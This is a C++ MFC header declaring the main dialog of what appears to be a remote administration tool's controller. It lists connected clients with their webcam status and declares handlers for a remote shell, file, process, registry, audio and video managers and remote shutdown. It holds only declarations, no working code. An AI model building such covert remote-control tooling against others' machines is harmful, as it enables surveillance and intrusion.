
// SamSung DiveDlg.h: 头文件
//

#pragma once
#include"ConfigFile.h"
#include"./TrueColorToolBar.h"
#include"IocpServer.h"
#include"VMMapDlg.h"
typedef struct
{
	char* TitleData;          //列表的名称
	int		TitleWidth;            //列表的宽度
}COLUMN_DATA;
// CSamSungDiveDlg 对话框
class CSamSungDiveDlg : public CDialogEx
{
// 构造
public:
	CSamSungDiveDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SAMSUNG_DIVE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:		//显示客户端上线信息

	void ServerStart();

	CListCtrl m_ClientInfo_List;
	CListCtrl m_ServerInfo_List;			//控件变量的声明
	CTrueColorToolBar m_TrueColorBar;		//控件变量的声明
	NOTIFYICONDATA m_NotifyIconData;		//托盘变量
	CConfigFile m_ConfigFile;
	USHORT m_ListenPort;
	ULONG m_MaxConnections;
	CIocpServer* m_IocpServer;            //创建通信类指针
	CStatusBar m_StatusBar;                  //关联控件  构造函数与DoDataExchange
	ULONG m_ConnectionCount=0;

	
	void InitListCtrl();
	void GetSystemTime();
	void InitSolidMenu();
	void InitTrueColorBar();
	void InitNotifyIconData();
	void DisplayMainDlgInfo(BOOL IsOK,CString &Message);
	VOID InitStatusBar();

	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnLocalSettings();
	afx_msg void OnAddTestInfo();
	afx_msg void OnExitProgram();
	afx_msg void OnClose();

	//真彩button的消息关联函数声明
	afx_msg VOID OnButtonCmdManager();
	afx_msg VOID OnButtonProcessManager();
	afx_msg VOID OnButtonWindowManager();
	afx_msg VOID OnButtonRemoteControl();
	afx_msg VOID OnButtonFileManager();
	afx_msg VOID OnButtonAudioManager();
	afx_msg VOID OnButtonCleanManager();
	afx_msg VOID OnButtonVideoManager();
	afx_msg VOID OnButtonServiceManager();
	afx_msg VOID OnButtonRegisterManager();
	afx_msg VOID OnButtonServerManager();
	afx_msg VOID OnButtonClientManager();
	afx_msg VOID OnButtonServerAbout();
	 
	//自定义消息函数（托盘消息处理函数）
	afx_msg void OnNotifyIconData(WPARAM wParam, LPARAM lParam);

	afx_msg void OnShow();
	afx_msg void OnHide();

	static VOID CALLBACK WndCallback(PCONTEXT_OBJECT ContextObject);           //窗口回调
	static VOID WndHandleIO(CONTEXT_OBJECT* ContextObject);          //进行数据分析

	afx_msg LRESULT OnClientLogin(WPARAM ParameterData1, LPARAM ParameterData2);

	

	VOID AddClientInfo(CString ClientAddress, CString ClientPosition,
		CString HostName,
		CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
		CString WebSpeed, CONTEXT_OBJECT* ContextObject);


	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickClientInfoList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDeleteClientInfo();
	afx_msg void OnInstantMessage();
	afx_msg void OnRemoteShutdown();
	VOID SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);

	afx_msg LRESULT OnOpenInstantMessageDialog(WPARAM ParameterData1, LPARAM ParameterData2);
	afx_msg LRESULT OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);
};
